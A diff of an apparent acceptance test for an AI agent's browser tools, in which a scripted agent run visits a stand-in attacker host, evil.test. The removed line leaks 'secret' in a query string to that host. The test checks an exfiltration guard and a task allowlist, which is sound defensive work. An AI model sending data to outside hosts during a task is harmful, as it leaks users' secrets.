@@ -46,7 +46,8 @@ describe.skipIf(!hasChrome())('web acceptance', { timeout: 60_000 }, () => {
     const t = createTestApp(
       [
         toolStep({ id: 'c1', name: 'browser_open', input: { url: shop } }),
-        toolStep({ id: 'c2', name: 'browser_open', input: { url: site.url('evil.test', '/x?leak=secret') } }),
+        // the address has no query, so the exfiltration guard lets it pass, and the allowlist of the task refuses it.
+        toolStep({ id: 'c2', name: 'browser_open', input: { url: site.url('evil.test', '/x') } }),
         toolStep({ id: 'c3', name: 'browser_submit', input: { url: shop, button: 'Buy now', fields } }),
         textStep('The order waits for your approval.'),
       ],
